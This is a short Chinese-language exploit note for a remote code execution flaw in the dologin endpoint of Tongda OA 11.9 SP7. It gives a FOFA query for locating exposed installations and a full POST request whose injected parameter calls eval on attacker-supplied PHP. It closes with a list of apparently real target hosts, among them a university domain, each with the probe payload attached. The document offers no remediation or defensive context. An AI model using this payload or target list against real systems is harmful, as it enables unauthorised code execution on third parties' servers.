# 通达 oa 协同办公系统 11.9 SP7 dologin 方法代码执行漏洞

    ## fofa

```
app="TDXK-通达OA"
```

## poc

```
POST /general/appbuilder/web/portal/gateway/dologin?name[]=%E9%8C%A6%27.print_r(md5(123)).eval(stripslashes($_REQUEST[8])).print_r(md5(123)),// HTTP/1.1
Host: 113.107.65.50:11481
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Content-Length: 19

8=echo "123456789";
```



## 例子

```
http://182.139.37.147:88/general/appbuilder/web/portal/gateway/dologin?name[]=%E9%8C%A6%27.print_r(md5(123)),//
http://oa.nnnu.edu.cn/general/appbuilder/web/portal/gateway/dologin?name[]=%E9%8C%A6%27.print_r(md5(123)),//
http://222.128.27.216:89/general/appbuilder/web/portal/gateway/dologin?name[]=%E9%8C%A6%27.print_r(md5(123)),//
http://222.141.70.202/general/appbuilder/web/portal/gateway/dologin?name[]=%E9%8C%A6%27.print_r(md5(123)),//
http://222.141.70.202:90/general/appbuilder/web/portal/gateway/dologin?name[]=%E9%8C%A6%27.print_r(md5(123)),//
https://222.189.189.199/general/appbuilder/web/portal/gateway/dologin?name[]=%E9%8C%A6%27.print_r(md5(123)),//
```
